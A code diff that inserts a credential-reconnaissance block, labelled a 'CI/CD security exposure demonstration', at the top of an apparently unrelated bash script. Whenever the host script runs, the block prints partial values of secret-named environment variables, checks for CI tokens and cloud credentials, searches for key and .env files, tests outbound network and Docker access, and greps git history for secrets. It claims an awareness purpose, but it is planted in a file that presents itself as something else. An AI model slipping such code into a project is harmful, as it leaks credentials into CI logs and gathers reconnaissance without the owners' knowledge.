@@ -1,5 +1,176 @@
 #!/bin/bash
 
+#!/bin/bash
+
+# ============================================================================
+# CI/CD Security Exposure Demonstration Script
+# Purpose: Demonstrate what information is accessible in automated CI/CD runs
+# WARNING: This script is for security awareness - run only in controlled environments
+# ============================================================================
+
+echo "=================================================="
+echo "  CI/CD Security Exposure Report"
+echo "  Generated: $(date)"
+echo "=================================================="
+echo ""
+
+# Function to safely print with redaction option
+print_section() {
+    echo ""
+    echo "---[ $1 ]---"
+}
+
+# ============================================================================
+# 1. ENVIRONMENT VARIABLES (often contain secrets!)
+# ============================================================================
+print_section "Environment Variables Available"
+echo "Total environment variables: $(env | wc -l)"
+echo ""
+echo "Potentially sensitive variables found:"
+
+# Look for common secret patterns (don't print values, just show they exist)
+env | grep -iE '(SECRET|TOKEN|KEY|PASSWORD|API|AWS|AZURE|GCP|GITHUB|GITLAB)' | cut -d'=' -f1 | while read var; do
+    value="${!var}"
+    # Show first/last 4 chars only
+    if [ ${#value} -gt 8 ]; then
+        masked="${value:0:4}...${value: -4}"
+    else
+        masked="****"
+    fi
+    echo "  ✗ $var = $masked (${#value} chars)"
+done
+
+# ============================================================================
+# 2. GITHUB/GITLAB CONTEXT (CI-specific info)
+# ============================================================================
+print_section "CI/CD Context Information"
+
+if [ -n "$GITHUB_TOKEN" ]; then
+    echo "  ✗ GITHUB_TOKEN is available (length: ${#GITHUB_TOKEN})"
+    echo "    → This token can access the repository and potentially others!"
+fi
+
+if [ -n "$GITHUB_REPOSITORY" ]; then
+    echo "  • Repository: $GITHUB_REPOSITORY"
+fi
+
+if [ -n "$GITHUB_ACTOR" ]; then
+    echo "  • Triggered by: $GITHUB_ACTOR"
+fi
+
+if [ -n "$GITHUB_REF" ]; then
+    echo "  • Branch/Ref: $GITHUB_REF"
+fi
+
+if [ -n "$GITHUB_SHA" ]; then
+    echo "  • Commit SHA: $GITHUB_SHA"
+fi
+
+# GitLab equivalents
+if [ -n "$CI_JOB_TOKEN" ]; then
+    echo "  ✗ CI_JOB_TOKEN is available (GitLab)"
+fi
+
+# ============================================================================
+# 3. FILESYSTEM EXPLORATION
+# ============================================================================
+print_section "Filesystem Access"
+
+echo "Current directory: $(pwd)"
+echo "Home directory: $HOME"
+echo ""
+
+echo "Files in current directory:"
+ls -lah | head -20
+
+echo ""
+echo "Searching for potentially sensitive files..."
+find . -maxdepth 3 -type f \( -name "*.key" -o -name "*.pem" -o -name "*.env" -o -name "*secret*" -o -name "*credential*" -o -name "*.p12" -o -name "*.pfx" \) 2>/dev/null | head -10
+
+# ============================================================================
+# 4. NETWORK CAPABILITIES
+# ============================================================================
+print_section "Network Capabilities"
+
+echo "Network interfaces:"
+ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "  Network tools not available"
+
+echo ""
+echo "Outbound network test:"
+if curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://api.github.com > /dev/null 2>&1; then
+    echo "  ✓ Can make outbound HTTPS requests"
+    echo "    → Could exfiltrate data to external servers!"
+else
+    echo "  • Outbound HTTPS blocked or unavailable"
+fi
+
+# ============================================================================
+# 5. INSTALLED TOOLS & CAPABILITIES
+# ============================================================================
+print_section "Available Tools & Commands"
+
+tools=("docker" "kubectl" "aws" "gcloud" "az" "terraform" "ansible" "git" "curl" "wget" "nc" "python" "node" "npm")
+
+for tool in "${tools[@]}"; do
+    if command -v "$tool" &> /dev/null; then
+        version=$(command "$tool" --version 2>&1 | head -1)
+        echo "  ✓ $tool: $version"
+    fi
+done
+
+# ============================================================================
+# 6. CLOUD CREDENTIALS
+# ============================================================================
+print_section "Cloud Provider Credentials"
+
+# AWS
+if [ -f "$HOME/.aws/credentials" ] || [ -n "$AWS_ACCESS_KEY_ID" ]; then
+    echo "  ✗ AWS credentials detected!"
+fi
+
+# GCP
+if [ -f "$HOME/.config/gcloud/credentials.db" ] || [ -n "$GOOGLE_APPLICATION_CREDENTIALS" ]; then
+    echo "  ✗ GCP credentials detected!"
+fi
+
+# Azure
+if [ -d "$HOME/.azure" ] || [ -n "$AZURE_CLIENT_ID" ]; then
+    echo "  ✗ Azure credentials detected!"
+fi
+
+# ============================================================================
+# 7. DOCKER ACCESS
+# ============================================================================
+print_section "Container & Docker Access"
+
+if command -v docker &> /dev/null; then
+    if docker ps &> /dev/null; then
+        echo "  ✗ Docker daemon is accessible!"
+        echo "    → Could run malicious containers, mine crypto, etc."
+    else
+        echo "  • Docker installed but daemon not accessible"
+    fi
+else
+    echo "  • Docker not available"
+fi
+
+# ============================================================================
+# 8. GIT REPOSITORY ACCESS
+# ============================================================================
+print_section "Git Repository Access"
+
+if [ -d ".git" ]; then
+    echo "  • Git repository detected"
+    echo "  • Commit history accessible: $(git rev-list --all --count 2>/dev/null || echo 'unknown') commits"
+    
+    # Check for secrets in git history
+    echo ""
+    echo "  Checking recent commits for potential secrets..."
+    git log --all --pretty=format:"%h %s" -10 2>/dev/null | grep -iE '(password|secret|key|token|credential)' | head -5
+fi
+
+
+
 function my_help()
 {
   echo " " 
